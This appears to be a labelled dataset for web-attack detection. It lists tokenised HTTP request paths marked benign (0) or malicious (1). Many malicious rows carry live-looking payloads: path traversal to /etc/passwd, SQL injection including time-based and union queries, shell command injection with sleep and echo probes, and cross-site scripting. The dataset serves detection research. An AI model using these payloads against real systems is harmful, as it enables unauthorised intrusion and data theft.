request	label
/ 39815_thumb / 	0
/ string / strings / parameters = 1181707541494323 	0
/ search ? ns-query-pat =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = & echo $ ifsynknbl $  (  ( 5 + 94 )  )  $  ( echo $ ifsynknbl ) ynknbl /  / 	1
/ en-us / account / lang / lang . php ? lang_path =  / etc / passwd \ x00 	1
/ javascript / ansi . exe 	1
/ string / strings / parameters = malory7 	0
/ 15700693 / 	0
/ clanmts-hd_05 / 	0
/ privruletxt / 	0
/ string / strings / parameters = poblete fiuza 	0
/ free donwload manager 1 / 	0
/ newspaper2 / 	0
/ accesspoint / 	0
/ string / strings / parameters = '   str =  $  ( echo fplfhr )   str1 =  $  {  # str }   if  [  2 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \ 	1
/ 606wkcop . php3 ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = '  echo $ ifsoetqlb $  (  ( 10 + 18 )  )  $  ( echo $ ifsoetqlb ) oetqlb /  / 	1
/ string / strings / parameters = 1 '  where 7190 = 7190 and 8148 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  -- 	1
/ javascript / tmpl . exe 	1
/ string / strings / parameters = cabaeros ,  131 	0
/ greyroundedcornerright / 	0
/ string / modo =  +  & login = mototsun & password = longitudinalmente & nombre = pedro & apellidos = berlingery & email = thrush_orhonsay6 @ aadsl . no & dni = 23532443q & direccion = c /  + polacas ,  + 59 + 1 ? f & ciudad = cubo + de + bureba & cp = 12170 & provincia = salamanca & ntc = 6489953845851590 & b1 = registrar 	1
/ 436167 / 	0
/ b00004tose / 	0
/ q63385238 	0
/ 20060111-9 / 	0
/ string / str =  $  ( echo hhrcur )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  | 	1
/ love song cd / 	0
/ string / strings / parameters = 1 '  ; select count (  *  )  from generate_series ( 1 , 5000000 )  and  ' fahy '  like  ' fahy 	1
/ string / strings / parameters = 1 )  )  as zldh where 3302 = 3302 rlike  ( select  ( case when  ( 1481 = 5677 )  then 1 else 0x28 end )  )  -- 	1
/ string / strings / parameters = woll @ stockdefotos . bb 	0
/ 451095147qplllk / 	0
/ string / strings / parameters = 1 )  )  as ambt where 5198 = 5198 and char ( 120 )  |  | char ( 106 )  |  | char ( 117 )  |  | char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 )  , 0 )  , 5000000000 )  , null )  -- 	1
/ javascript / signin . nsf 	0
/ string / strings / parameters = otia 	0
/ string / modo = registro & login = terryl & password = des9erco & nombre = haroid & apellidos = dawaher & email =  ' injected_param & dni = 14559882p & direccion = c /  + doctor + francisco + saiz + sanz ,  + 159 ,  +  & ciudad = alberca ,  + la & cp = 03770 & provincia = salamanca & ntc = 3772824400880183 & b1 = registrar 	1
/ string / strings / parameters = | echo $ ifsuxkugt $  (  ( 68 + 89 )  )  $  ( echo $ ifsuxkugt ) uxkugt \  \ 	1
/ -13238 / 	0
/ rantarchive / 	0
/ string / strings / parameters = gorecka-fosser @ peaf . sl 	0
/ javascript / 17 . c 	0
/ letharic / 	0
/ javascript / aa . php3 	0
/ javascript / links . tar . bz2 	0
/ string / modo = registro & login = cannatar & password = 7i78o02 & nombre = sofanor & apellidos = cortadel + montori & email = mckechnie @ beatrizbalado . sh & dni = 50674086a & direccion = calle + los + vidrieros ,  + 93 ,  + 4-d & ciudad = regueras ,  + las & cp = 24221	1
/ string / strings / parameters = stalin 	0
"/ string / strings / parameters = -6294 ""  ""  union all select 9921 , 9921 , 9921 , 9921 , 9921 , 9921 -- "	1
/ brew24 / 	0
/ javascript / controller . sql 	0
"/ main . php ? stuff =  "" ver & rem \ xa0 "	1
/ string / strings / parameters = 88003603z 	0
"/ string / strings / parameters = ""  echo kemgcu $  (  ( 7 + 98 )  )  $  ( echo kemgcu ) kemgcu & "	1
/ javascript / zimbra . xsl 	0
/ examples / jsp / sessions / source ? v =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
"/ tuwjta1w . fts ?  < script > document . cookie =  "" testpokn = 7494 ;  ""  <  / script > "	1
/ 1234000263054348 / 	0
/ string / strings / parameters = < body onload =  `  `  `  $  { prompt `  `  }  `  > 	1
/ edyson_105x110 / 	0
/ examples / jsp / error / cvslog . cgi ? file =  < script > window . alert <  / script > 	1
/ string / id = 2 & nombre = jamn + ibrico & precio = 100 /  & cantidad = 60 & b1 = aadir + al + carrito 	1
/  .  . 0x2f { file } 	1
/ javascript / updated . bz2 	0
/ string / strings / parameters = 1 '  in boolean mode )  and  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 3484 = 3484 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  # 	1
/ opinion . php 	0
/ image0221164020411863 / 	0
/ string / strings / parameters = ;  str =  $  ( echo qiikmd )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  | 	1
/ ozanhmd / 	0
/ string / modo = registro & login = sudip & password = a25e7e & nombre = wady & apellidos = sevilla + subauste & email = stadlen @ asociaciondearquitectoslatinoamericanos . tc & dni = 60586849l & direccion = calle + rocafort ,  + 169 + 4c & ciudad = cerralbo & cp = 45569 & provincia = guadalajara & ntc = 1918370923327655 & b1 = registrar 	0
/ string / strings / parameters = 400ol4 	0
/ string / strings / parameters = -8133 '  )  union all select 6417 , 6417 , 6417 , 6417 , 6417 , 6417 , 6417 , 6417 -- 	1
